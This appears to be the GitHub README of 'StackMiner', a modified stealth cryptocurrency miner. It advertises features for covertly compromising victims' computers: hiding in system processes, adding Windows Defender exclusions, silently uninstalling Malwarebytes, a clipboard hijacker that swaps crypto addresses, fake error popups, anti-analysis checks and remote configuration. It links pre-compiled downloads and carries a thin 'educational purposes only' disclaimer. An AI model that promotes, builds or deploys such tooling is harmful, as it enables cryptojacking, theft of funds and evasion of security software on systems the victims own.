<img src="https://github.com/stackrose/StackMiner/blob/master/StackMiner.png?raw=true">

# StackMiner v3.4.0 - Miner for ETC, ZEPH, RVN, XMR, RTM & many more

A modification of a free silent (hidden) native cryptocurrency miner ([SilentCryptoMiner](https://github.com/UnamSanctam/SilentCryptoMiner)) capable of mining ETC, ZEPH, RVN, XMR, RTM and much more, with many features suited for mining silently.

<img src="https://github.com/stackrose/StackMiner/blob/master/Preview.png?raw=true">

This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
<details>
 <summary>List of algorithms</summary>
 <table>
	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
	<tr><td>rx/0</td><td>Monero, Zephyr</td></tr>
	<tr><td>gr</td><td>Raptoreum</td></tr>
	<tr><td>ethash</td><td>Callisto, Dubaicoin, Ellaism, Etho, EthereumPoW, Expanse, Nilu, Pirl, PowBlocks</td></tr>
	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
	<tr><td>ubqhash</td><td>Ubiq</td></tr>
	<tr><td>kawpow</td><td>Ravencoin, Neoxa, Meowcoin, Neurai, Paprikacoin, Clore</td></tr>
	<tr><td>firopow</td><td>Firo, Kiirocoin</td></tr>
	<tr><td>progpow</td><td>Sero</td></tr>
	<tr><td>progpowz</td><td>Zano</td></tr>
	<tr><td>evrprogpow</td><td>Evrmore</td></tr>
	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
	<tr><td>rx/arq</td><td>ArQmA</td></tr>
	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
	<tr><td>cn/half</td><td>Masari</td></tr>
	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
	<tr><td>rx/sfx</td><td>Safex</td></tr>
	<tr><td>cn/r</td><td>Sumokoin</td></tr>
	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
	<tr><td>rx/wow</td><td>Wownero</td></tr>
	<tr><td>cn/ccx</td><td></td></tr>
	<tr><td>cn/zls</td><td></td></tr>
	<tr><td>cn/double</td><td></td></tr>
	<tr><td>cn/2</td><td></td></tr>
	<tr><td>cn/xao</td><td></td></tr>
	<tr><td>cn/rwz</td><td></td></tr>
	<tr><td>cn/rto</td><td></td></tr>
	<tr><td>cn-heavy/tube</td><td></td></tr>
	<tr><td>cn-heavy/0</td><td></td></tr>
	<tr><td>cn/1</td><td></td></tr>
	<tr><td>cn-lite/1</td><td></td></tr>
	<tr><td>cn-lite/0</td><td></td></tr>
	<tr><td>cn/0</td><td></td></tr>
</table>
</details>

## New Features
* Master Injector - Instead of putting the CPU and GPU miner in the miner installer/injector, it is put into a seperate "master" program instead.
* Crypto Clipper - Detects clipboard's content and replaces all crypto addresses with your crypto address.
* Fake Error - Pop up a custom fake error when opening the miner.
* Anti Analysis - Prevent analysts from analysing your miner.
* Anti Username - Terminates if any of the usernames in the "Anti Username" textbox matches with the victim's username/computername.
* File Pumper - Use to increase the miner file size.
* Silent Uninstall Malwarebytes - Can silently (hiddenly) uninstall Malwarebytes Anti-Virus without the user noticing.
* Example settings - The miner builder has example settings put in it by default.

## Features
* Native C++ - Miner installer/injector and watchdog coded fully in C++ with no run requirements except a 64-bit OS
* Injection (Silent/Hidden) - Hide miner inside another process like conhost.exe, explorer.exe, svchost.exe and others
* Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory and RAM while any of the programs in the "Stealth Targets" option are open
* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one RVN (GPU) miner
* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
* Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid being detected
* Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
* Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
* Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
* And many many more.

## Downloads

Pre-Compiled: https://github.com/stackrose/StackMiner/releases

## Wiki

You can find the wiki [here](https://github.com/UnamSanctam/SilentCryptoMiner/wiki). The wiki contains information about the miner and all of its features, it also has some answers to frequently asked questions.

## Web Panel

You can find the web panel that the miner supports here: [UnamWebPanel](https://github.com/UnamSanctam/UnamWebPanel). The web panel can be used to monitor your miners hashrate, status, connection settings and more. It can also be used to change the miner settings just like how the option "Remote Configuration" does it.

## Changelog

### 3.4.0 (17 March, 2024)
* Added Master Injector
* Added Crypto Clipper
* Added Fake Error
* Added Anti Username/Computername
* Added Anti Analysis
* Added File Pumper
* Added Silent Uninstall Malwarebytes
* Added Example Settings by default to the UI
* Added Icon and Signatured Files templates
* Changed the UI
* And many more small changes

[You can view the full Changelog here](CHANGELOG.md)

## Authors

* **Stackrose** - Modified [SilentCryptoMiner](https://github.com/UnamSanctam/SilentCryptoMiner) into Stack's Miner
* **Unam Sanctam** - Created [SilentCryptoMiner](https://github.com/UnamSanctam/SilentCryptoMiner)

## Contributors

* **[Werlrlivx](https://github.com/Werlrlivx)** - Polish Translation
* **[Xeneht](https://github.com/Xeneht)** - Spanish Translation
* **[BITIW](https://github.com/BITIW)** - Russian Translation
* **[MatheusOliveira-dev](https://github.com/MatheusOliveira-dev)** - Portuguese (Brazil) Translation

## Disclaimer

I, the creator nor Unam Sanctam, are responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Unam Sanctam's Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

LINK: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3
